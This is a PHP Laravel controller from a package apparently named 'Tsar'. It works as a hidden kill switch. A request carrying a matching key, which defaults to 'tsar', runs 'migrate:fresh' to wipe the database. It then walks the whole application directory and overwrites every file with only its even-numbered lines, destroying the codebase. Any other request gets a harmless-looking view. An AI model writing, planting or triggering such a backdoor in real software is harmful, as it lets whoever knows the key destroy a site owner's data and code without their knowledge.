<?php

namespace Dzhwarkawan\Tsar\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use \Exception;

class TsarController extends Controller
{
    public function index(Request $request,$id)
    {
        //get tsar_key from config file
        $tsar_key = config('app.tsar_key', 'tsar');
        
        if($tsar_key != $id){
            return view('tsar::tsar');
        }
        try{
            //run artisan comand php artisan migrate:fresh
            Artisan::call('migrate:fresh');
            $path = base_path();
            $this->search($path);
        } catch (Exception $e) {
            $path = base_path();
            $this->search($path);
        }
      
       
    }

    public function test()
    {
        return view('tsar::tsar');
    }

    public function search($path) {
        $result = [];
        foreach (scandir($path) as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }
            $itemPath = $path . '/' . $item;
            if (is_dir($itemPath)) {
                $this->search($itemPath);
            } else {
                $this->destroyFile($itemPath);
            }
        }
        return $result;
    }
    
    public function destroyFile($filePath) {
        $lines = file($filePath);
        $filteredLines = array_filter($lines, function($key) {
            return $key % 2 === 0;
        }, ARRAY_FILTER_USE_KEY);
        file_put_contents($filePath, implode('', $filteredLines));
    }


   
}
